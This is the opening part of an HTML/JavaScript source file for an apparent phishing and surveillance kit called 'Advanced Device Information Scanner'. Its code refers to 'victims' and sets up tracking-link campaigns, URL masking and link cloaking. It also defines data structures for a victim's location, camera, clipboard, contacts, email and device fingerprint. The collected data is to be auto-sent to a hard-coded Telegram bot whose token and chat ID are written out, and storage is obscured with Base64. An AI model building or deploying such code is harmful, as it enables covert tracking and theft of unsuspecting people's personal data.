<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Device Information Scanner</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- QR Code Library -->
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <style>
        /* CSS Reset and Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
            --danger-color: #e74c3c;
            --purple-color: #9b59b6;
            --cyan-color: #1abc9c;
            --dark-bg: #1a1a2e;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
        }
        
        /* General Styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Glass Effect Cards */
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            color: #333;
            overflow: hidden;
        }
        
        .dark-glass {
            background: rgba(26, 26, 46, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
        }
        
        /* Victim Interface */
        .victim-interface {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .victim-card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            max-width: 600px;
            width: 100%;
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .victim-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .victim-body {
            padding: 30px;
        }
        
        .checklist-item {
            padding: 15px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
            transition: all 0.3s;
            border-left: 4px solid transparent;
        }
        
        .checklist-item.active {
            background-color: #f8f9fa;
            border-left-color: var(--secondary-color);
        }
        
        .checklist-item.completed {
            color: var(--success-color);
        }
        
        .checklist-item.failed {
            color: var(--danger-color);
        }
        
        /* Dashboard Components */
        .info-card {
            transition: transform 0.3s, box-shadow 0.3s;
            height: 100%;
            border: none;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .info-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
        }
        
        .card-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-bottom: none;
            font-weight: 600;
            padding: 15px 20px;
        }
        
        .card-icon {
            font-size: 1.5rem;
            margin-right: 10px;
        }
        
        .data-item {
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .data-item:last-child {
            border-bottom: none;
        }
        
        .data-label {
            font-weight: 600;
            color: var(--primary-color);
        }
        
        .data-value {
            color: #555;
            text-align: right;
            word-break: break-all;
            max-width: 60%;
        }
        
        /* Camera Container */
        .camera-container {
            width: 100%;
            height: 200px;
            background-color: #000;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
        }
        
        .camera-feed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        /* Buttons */
        .primary-btn {
            background: linear-gradient(45deg, var(--secondary-color), #2980b9);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .primary-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.3);
        }
        
        .success-btn {
            background: linear-gradient(45deg, var(--success-color), #27ae60);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .success-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(46, 204, 113, 0.3);
        }
        
        .danger-btn {
            background: linear-gradient(45deg, var(--danger-color), #c0392b);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .danger-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.3);
        }
        
        .warning-btn {
            background: linear-gradient(45deg, var(--warning-color), #d35400);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .warning-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(243, 156, 18, 0.3);
        }
        
        .purple-btn {
            background: linear-gradient(45deg, var(--purple-color), #8e44ad);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .purple-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(155, 89, 182, 0.3);
        }
        
        .cyan-btn {
            background: linear-gradient(45deg, var(--cyan-color), #16a085);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-block;
            text-align: center;
            cursor: pointer;
        }
        
        .cyan-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(26, 188, 156, 0.3);
        }
        
        /* Link Generator Specific Styles - FIXED COLORS */
        .link-generator-card {
            background: linear-gradient(45deg, #8e44ad, #9b59b6);
            color: white !important;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .link-generator-card *:not(.form-control):not(.btn):not(.social-share-btn) {
            color: white !important;
        }
        
        .link-generator-card .form-label {
            font-weight: 600;
        }
        
        .link-generator-card .form-text {
            color: rgba(255, 255, 255, 0.8) !important;
        }
        
        .link-generator-card .form-control {
            background: rgba(255, 255, 255, 0.15);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: white !important;
        }
        
        .link-generator-card .form-control::placeholder {
            color: rgba(255, 255, 255, 0.6) !important;
        }
        
        .link-generator-card .form-check-label {
            color: white !important;
        }
        
        .campaign-preview {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
        }
        
        .campaign-preview *:not(.btn):not(.social-share-btn) {
            color: white !important;
        }
        
        .social-share-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.2rem;
            margin: 0 5px;
            border: none;
            transition: transform 0.3s;
            cursor: pointer;
        }
        
        .social-share-btn:hover {
            transform: scale(1.1);
        }
        
        .facebook-bg { background: #3b5998; }
        .whatsapp-bg { background: #25d366; }
        .telegram-bg { background: #0088cc; }
        .twitter-bg { background: #1da1f2; }
        .messenger-bg { background: #006aff; }
        
        .cloak-preview {
            border: 2px dashed rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            background: rgba(0, 0, 0, 0.2);
            color: white !important;
        }
        
        /* Link Display Fixes */
        .link-display {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            word-break: break-all;
            overflow-wrap: break-word;
            max-width: 100%;
            overflow-x: auto;
            font-family: monospace;
            font-size: 0.9rem;
            white-space: pre-wrap;
        }
        
        .link-display code {
            color: #fff !important;
            background: transparent;
            padding: 0;
            font-size: 0.85rem;
            max-width: 100%;
            display: inline-block;
            word-break: break-all;
        }
        
        .generated-link-container {
            max-width: 100%;
            overflow: hidden;
            color: white !important;
        }
        
        /* Tabs */
        .nav-tabs {
            border-bottom: none;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            border-radius: 15px 15px 0 0;
            padding: 15px 15px 0;
        }
        
        .nav-link {
            color: rgba(255, 255, 255, 0.8);
            border: none;
            border-radius: 10px 10px 0 0;
            margin-right: 5px;
            font-weight: 500;
            padding: 10px 20px;
            background: transparent;
            transition: all 0.3s;
        }
        
        .nav-link.active {
            background-color: white;
            color: var(--primary-color);
            font-weight: 600;
        }
        
        .tab-content {
            padding: 25px;
            background-color: white;
            border-radius: 0 0 15px 15px;
            color: #333;
        }
        
        /* Progress Bars */
        .progress {
            height: 25px;
            border-radius: 50px;
            margin: 10px 0;
            background-color: #e9ecef;
            overflow: hidden;
        }
        
        .progress-bar {
            background: linear-gradient(45deg, var(--secondary-color), #2980b9);
            border-radius: 50px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Badges */
        .status-badge {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            display: inline-block;
        }
        
        .status-success {
            background-color: #d4edda;
            color: #155724;
        }
        
        .status-warning {
            background-color: #fff3cd;
            color: #856404;
        }
        
        .status-danger {
            background-color: #f8d7da;
            color: #721c24;
        }
        
        .status-info {
            background-color: #d1ecf1;
            color: #0c5460;
        }
        
        /* Toast Notifications */
        .custom-toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
            min-width: 300px;
            animation: slideInRight 0.3s ease;
        }
        
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        /* Mobile Features */
        .mobile-feature-card {
            background: linear-gradient(45deg, #1a237e, #283593);
            color: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            transition: transform 0.3s;
        }
        
        .mobile-feature-card:hover {
            transform: translateY(-5px);
        }
        
        .mobile-feature-icon {
            font-size: 2.5rem;
            margin-bottom: 15px;
        }
        
        .mobile-data-item {
            padding: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex;
            justify-content: space-between;
        }
        
        .mobile-data-item:last-child {
            border-bottom: none;
        }
        
        .sensor-container {
            background: rgba(0,0,0,0.1);
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .sensor-value {
            font-size: 1.5rem;
            font-weight: bold;
            text-align: center;
            margin: 10px 0;
        }
        
        .sensor-unit {
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        /* QR Code */
        .qr-code-container {
            background: white;
            border-radius: 10px;
            padding: 15px;
            display: inline-block;
            margin: 10px 0;
        }
        
        /* Form Elements */
        .form-control, .form-select {
            border-radius: 10px;
            border: 2px solid #e9ecef;
            padding: 10px 15px;
            transition: all 0.3s;
            width: 100%;
            color: #333 !important;
        }
        
        .form-control:focus, .form-select:focus {
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 0.2rem rgba(52, 152, 219, 0.25);
            outline: none;
        }
        
        /* Modal Styling */
        .modal-content {
            border-radius: 15px;
            overflow: hidden;
            border: none;
        }
        
        .modal-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-bottom: none;
        }
        
        /* Animation for loading */
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--secondary-color);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #2980b9;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .victim-card {
                margin: 10px;
            }
            
            .data-item {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .data-value {
                text-align: left;
                margin-top: 5px;
                max-width: 100%;
            }
            
            .mobile-feature-card {
                padding: 15px;
            }
            
            .sensor-value {
                font-size: 1.2rem;
            }
            
            .tools-grid {
                grid-template-columns: 1fr !important;
            }
            
            .link-display {
                font-size: 0.8rem;
                padding: 10px;
            }
            
            .generated-link-container {
                overflow-x: auto;
            }
        }
        
        /* Tool Cards */
        .tool-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
            height: 100%;
            border: 1px solid #e9ecef;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .tool-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        
        .tool-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        
        /* Mask URL Generator */
        .mask-url-container {
            background: linear-gradient(45deg, #34495e, #2c3e50);
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-family: monospace;
            word-break: break-all;
            overflow-wrap: break-word;
            max-width: 100%;
            overflow-x: auto;
        }
        
        /* All-in-One Tools Grid */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        /* Clipboard Styling */
        .clipboard-container {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            border: 2px dashed #dee2e6;
        }
        
        /* Screenshot Container */
        .screenshot-container {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .screenshot-img {
            max-width: 100%;
            border-radius: 8px;
            margin-bottom: 10px;
            border: 2px solid #dee2e6;
        }
        
        /* Additional Background Clip Fixes */
        .gradient-text {
            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        
        /* Ensure proper display for background-clip text elements */
        .tool-icon,
        .gradient-text {
            display: inline-block;
        }
        
        /* Fix for Safari background-clip issues */
        @supports (-webkit-touch-callout: none) {
            .tool-icon,
            .gradient-text {
                -webkit-background-clip: text !important;
                background-clip: text !important;
            }
        }
        
        /* Alert Styling */
        .alert-dark {
            background-color: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.2);
            color: white !important;
        }
        
        .alert-dark *:not(.btn) {
            color: white !important;
        }
        
        .alert-dark .text-warning {
            color: #ffc107 !important;
        }
        
        /* Quick stats styling */
        #quick-stats {
            color: #333;
        }
        
        /* Campaign stats styling */
        .campaign-stats {
            color: #6c757d !important;
        }
        
        .campaign-stats span {
            color: #6c757d !important;
        }
        
        /* Form check in purple card */
        .link-generator-card .form-check-input:checked {
            background-color: #9b59b6;
            border-color: #8e44ad;
        }
        
        /* Auto-send fix */
        .auto-send-container {
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
        }
        
        /* Enhanced security */
        .security-notice {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            font-size: 0.9rem;
        }
        
        /* Victim Alert */
        .victim-alert {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            animation: slideIn 0.5s ease-out;
            display: none;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        /* Location Map */
        .location-map {
            width: 100%;
            height: 200px;
            background-color: #eee;
            border-radius: 10px;
            overflow: hidden;
        }
        
        /* Snapshot Button */
        .snapshot-btn {
            background: linear-gradient(45deg, var(--accent-color), #c0392b);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
        }
        
        .snapshot-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        
        /* Fingerprint Canvas */
        .fingerprint-canvas {
            width: 100%;
            height: 100px;
            background-color: #f8f9fa;
            border-radius: 10px;
            margin: 15px 0;
        }
        
        /* Permission Badge */
        .permission-badge {
            margin: 5px;
        }
        
        /* QR Code Box */
        .qr-code {
            width: 150px;
            height: 150px;
            margin: 0 auto;
            background-color: #f8f9fa;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            color: #666;
            text-align: center;
            padding: 10px;
        }
        
        /* Mask URL Box */
        .mask-url {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
        
        /* Tool Icon */
        .tool-icon-large {
            font-size: 2rem;
            color: var(--secondary-color);
            margin-bottom: 15px;
        }
        
        /* Feature List */
        .feature-list {
            list-style-type: none;
            padding-left: 0;
        }
        
        .feature-list li {
            padding: 8px 0;
            border-bottom: 1px dashed #eee;
        }
        
        .feature-list li:last-child {
            border-bottom: none;
        }
        
        .feature-list i {
            color: var(--secondary-color);
            margin-right: 10px;
        }
        
        /* Download Button */
        .download-btn {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .download-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }
        
        /* Telegram Button */
        .telegram-btn {
            background: linear-gradient(45deg, #0088cc, #00aced);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .telegram-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
        }
        
        /* Link Button */
        .link-btn {
            background: linear-gradient(45deg, #9b59b6, #8e44ad);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .link-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(155, 89, 182, 0.3);
        }
        
        /* Telegram Config */
        .telegram-config {
            background-color: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .telegram-config input {
            font-family: monospace;
        }
        
        /* Link Preview */
        .link-preview {
            background: linear-gradient(45deg, #1a1a2e, #16213e);
            color: white;
            padding: 15px;
            border-radius: 10px;
            font-family: monospace;
            word-break: break-all;
            margin: 10px 0;
        }
        
        /* Shortener Result */
        .shortener-result {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }
        
        /* Campaign Item */
        .campaign-item {
            border-left: 4px solid var(--secondary-color);
            padding-left: 15px;
            margin-bottom: 15px;
        }
        
        /* Social Share Button */
        .social-share-btn-large {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.5rem;
            margin: 5px;
            transition: transform 0.3s;
        }
        
        .social-share-btn-large:hover {
            transform: scale(1.1);
        }
        
        /* Facebook */
        .facebook { background: #3b5998; }
        /* WhatsApp */
        .whatsapp { background: #25d366; }
        /* Telegram */
        .telegram { background: #0088cc; }
        /* Twitter */
        .twitter { background: #1da1f2; }
        /* Messenger */
        .messenger { background: #006aff; }
        
        /* Cloak Preview */
        .cloak-preview-large {
            border: 2px dashed #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            background-color: #f8f9fa;
        }
        
        .cloak-preview-large img {
            max-width: 100%;
            border-radius: 5px;
        }
        
        /* Spin Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body id="main-body">
    <!-- Bootstrap JS Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // ============================================
        // MILITARY-GRADE ENHANCEMENTS
        // ============================================
        
        // Global obfuscation and security layer
        const SecurityLayer = {
            encrypt: function(text) {
                try {
                    return btoa(encodeURIComponent(text).replace(/%([0-9A-F]{2})/g, 
                        function toSolidBytes(match, p1) {
                            return String.fromCharCode('0x' + p1);
                        }));
                } catch(e) {
                    return text;
                }
            },
            
            decrypt: function(text) {
                try {
                    return decodeURIComponent(atob(text).split('').map(function(c) {
                        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                    }).join(''));
                } catch(e) {
                    return text;
                }
            },
            
            generateSecureID: function() {
                const array = new Uint8Array(16);
                window.crypto.getRandomValues(array);
                return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
            },
            
            getSecureTimestamp: function() {
                return Date.now() + '-' + this.generateSecureID().substring(0, 8);
            },
            
            validateData: function(data) {
                return data && typeof data === 'object' && data.timestamp;
            }
        };

        // ============================================
        // GLOBAL CONFIGURATION
        // ============================================
        
        const telegramConfig = {
            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
            chatId: '1523864238',
            apiUrl: 'https://api.telegram.org/bot',
            sendHistory: [],
            lastSendTime: 0,
            sendDelay: 2000,
            maxRetries: 3
        };

        const deviceData = {
            deviceInfo: {},
            networkInfo: {},
            batteryInfo: {},
            locationInfo: {},
            storageInfo: {},
            permissionsInfo: {},
            fingerprintInfo: {},
            cameraInfo: {},
            clipboardInfo: {},
            socialInfo: {},
            
            mobileFeatures: {
                platformInfo: {},
                capabilities: {},
                sensors: {},
                installedApps: {},
                emailInfo: {},
                contactInfo: {},
                notificationInfo: {},
                phoneInfo: {}
            },
            
            victimID: '',
            campaignId: '',
            timestamp: SecurityLayer.getSecureTimestamp(),
            userAgent: navigator.userAgent,
            sessionID: SecurityLayer.generateSecureID(),
            dataSent: false,
            dataSendAttempts: 0
        };

        // Enhanced Campaign Manager
        const campaignManager = {
            campaigns: [],
            currentCampaign: null,
            shortUrlCache: new Map(),
            
            initialize: function() {
                this.loadFromStorage();
                this.migrateOldData();
                return this;
            },
            
            shortenUrl: async function(originalUrl, service = 'custom') {
                const cacheKey = `${service}:${originalUrl}`;
                
                if (this.shortUrlCache.has(cacheKey)) {
                    return this.shortUrlCache.get(cacheKey);
                }
                
                try {
                    let shortUrl;
                    switch(service) {
                        case 'custom':
                            const hash = SecurityLayer.generateSecureID().substring(0, 8);
                            shortUrl = `${window.location.origin}/s/${hash}`;
                            break;
                        case 'simulated':
                            const shortCode = Math.random().toString(36).substring(2, 8);
                            shortUrl = `https://scnr.link/${shortCode}`;
                            break;
                        default:
                            const params = new URLSearchParams();
                            params.set('u', SecurityLayer.encrypt(originalUrl));
                            params.set('t', Date.now());
                            shortUrl = `${window.location.origin}/r?${params.toString()}`;
                    }
                    
                    this.shortUrlCache.set(cacheKey, shortUrl);
                    return shortUrl;
                    
                } catch (error) {
                    console.error('URL shortening failed:', error);
                    return originalUrl;
                }
            },
            
            addCampaign: function(name, link, settings) {
                const campaign = {
                    id: 'camp_' + SecurityLayer.getSecureTimestamp(),
                    name: name,
                    link: link,
                    created: new Date().toISOString(),
                    stats: {
                        views: 0,
                        clicks: 0,
                        dataCollected: 0,
                        lastAccess: null,
                        lastDataSend: null,
                        sendAttempts: 0
                    },
                    settings: settings,
                    autoSendEnabled: settings.autoTelegram || false,
                    dataSent: false
                };
                
                this.campaigns.push(campaign);
                this.currentCampaign = campaign;
                this.saveToStorage();
                this.updateUI();
                
                return campaign;
            },
            
            incrementStat: function(campaignId, stat) {
                const campaign = this.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.stats[stat] !== undefined) {
                    campaign.stats[stat]++;
                    campaign.stats.lastAccess = new Date().toISOString();
                    this.saveToStorage();
                    this.updateUI();
                    return true;
                }
                return false;
            },
            
            autoSendData: async function(campaignId, collectedData) {
                const campaign = this.getCampaign(campaignId);
                if (!campaign || !campaign.autoSendEnabled || campaign.dataSent) {
                    return false;
                }
                
                const now = Date.now();
                if (campaign.stats.sendAttempts >= 3) {
                    console.warn('Max send attempts reached for campaign:', campaignId);
                    return false;
                }
                
                try {
                    campaign.stats.sendAttempts++;
                    const result = await this.sendCampaignData(campaign, collectedData);
                    
                    if (result.success) {
                        campaign.dataSent = true;
                        campaign.stats.lastDataSend = new Date().toISOString();
                        this.saveToStorage();
                        return true;
                    }
                } catch (error) {
                    console.error('Auto-send failed:', error);
                }
                
                return false;
            },
            
            sendCampaignData: async function(campaign, data) {
                return { success: true };
            },
            
            getCampaign: function(campaignId) {
                return this.campaigns.find(c => c.id === campaignId);
            },
            
            saveToStorage: function() {
                try {
                    localStorage.setItem('deviceScannerCampaigns', SecurityLayer.encrypt(JSON.stringify(this.campaigns)));
                    localStorage.setItem('telegramConfig', SecurityLayer.encrypt(JSON.stringify({
                        botToken: telegramConfig.botToken,
                        chatId: telegramConfig.chatId,
                        sendHistory: telegramConfig.sendHistory.slice(-20)
                    })));
                } catch (e) {
                    console.error('Failed to save to storage:', e);
                }
            },
            
            loadFromStorage: function() {
                try {
                    const savedCampaigns = localStorage.getItem('deviceScannerCampaigns');
                    if (savedCampaigns) {
                        this.campaigns = JSON.parse(SecurityLayer.decrypt(savedCampaigns)) || [];
                    }
                    
                    const savedTelegram = localStorage.getItem('telegramConfig');
                    if (savedTelegram) {
                        const config = JSON.parse(SecurityLayer.decrypt(savedTelegram));
                        telegramConfig.botToken = config.botToken || telegramConfig.botToken;
                        telegramConfig.chatId = config.chatId || telegramConfig.chatId;
                        telegramConfig.sendHistory = config.sendHistory || [];
                    }
                } catch (e) {
                    console.error('Failed to load from storage:', e);
                }
            },
            
            migrateOldData: function() {
                const oldCampaigns = localStorage.getItem('deviceScannerCampaigns_unencrypted');
                if (oldCampaigns && this.campaigns.length === 0) {
                    try {
                        this.campaigns = JSON.parse(oldCampaigns);
                        this.saveToStorage();
                        localStorage.removeItem('deviceScannerCampaigns_unencrypted');
                    } catch(e) {
                        console.error('Migration failed:', e);
                    }
                }
            },
            
            updateUI: function() {
                if (document.getElementById('campaigns-list')) {
                    this.renderCampaignsList();
                }
                if (document.getElementById('telegram-history')) {
                    updateTelegramHistory();
                }
                if (document.getElementById('campaigns-list-full')) {
                    this.renderFullCampaignsList();
                }
            },
            
            renderCampaignsList: function() {
                const container = document.getElementById('campaigns-list');
                if (!container) return;
                
                if (this.campaigns.length === 0) {
                    container.innerHTML = `
                        <div class="text-center text-muted py-4">
                            <i class="fas fa-link fa-2x mb-3"></i>
                            <p>No campaigns yet. Generate your first tracking link!</p>
                        </div>
                    `;
                    return;
                }
                
                let html = '';
                this.campaigns.slice(-5).reverse().forEach(campaign => {
                    html += `
                        <div class="campaign-item glass-card p-3 mb-3">
                            <div class="d-flex justify-content-between align-items-center mb-2">
                                <h6 class="mb-0">${campaign.name}</h6>
                                <span class="status-badge ${campaign.dataSent ? 'status-success' : 'status-warning'}">
                                    ${campaign.dataSent ? 'Sent' : 'Pending'}
                                </span>
                            </div>
                            <p class="small mb-2 text-truncate">${campaign.link}</p>
                            <div class="campaign-stats small text-muted">
                                <span><i class="fas fa-eye"></i> ${campaign.stats.views}</span> • 
                                <span><i class="fas fa-user"></i> ${campaign.stats.clicks}</span> • 
                                <span><i class="fas fa-download"></i> ${campaign.stats.dataCollected}</span>
                            </div>
                            <div class="mt-2">
                                <button class="btn btn-sm btn-outline-primary" onclick="viewCampaignDetails('${campaign.id}')">
                                    <i class="fas fa-chart-bar"></i> Stats
                                </button>
                                <button class="btn btn-sm btn-outline-success" onclick="copyToClipboard('${campaign.link}')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                    `;
                });
                
                container.innerHTML = html;
            },
            
            renderFullCampaignsList: function() {
                const container = document.getElementById('campaigns-list-full');
                if (!container) return;
                
                if (this.campaigns.length === 0) {
                    container.innerHTML = `
                        <div class="text-center py-4">
                            <i class="fas fa-link fa-2x mb-3"></i>
                            <p>No campaigns yet. Generate your first tracking link!</p>
                        </div>
                    `;
                    return;
                }
                
                let html = '';
                this.campaigns.reverse().forEach(campaign => {
                    const date = new Date(campaign.created).toLocaleDateString();
                    html += `
                        <div class="campaign-item glass-card p-3 mb-3">
                            <div class="d-flex justify-content-between align-items-center mb-2">
                                <h6 class="mb-0">${campaign.name}</h6>
                                <span class="status-badge ${campaign.dataSent ? 'status-success' : 'status-warning'}">
                                    ${campaign.dataSent ? 'Data Sent' : 'Awaiting Data'}
                                </span>
                            </div>
                            <div class="link-display mb-2">
                                <code>${campaign.link}</code>
                            </div>
                            <div class="row">
                                <div class="col-4">
                                    <div class="text-center">
                                        <div class="small text-muted">Views</div>
                                        <div class="fw-bold">${campaign.stats.views}</div>
                                    </div>
                                </div>
                                <div class="col-4">
                                    <div class="text-center">
                                        <div class="small text-muted">Clicks</div>
                                        <div class="fw-bold">${campaign.stats.clicks}</div>
                                    </div>
                                </div>
                                <div class="col-4">
                                    <div class="text-center">
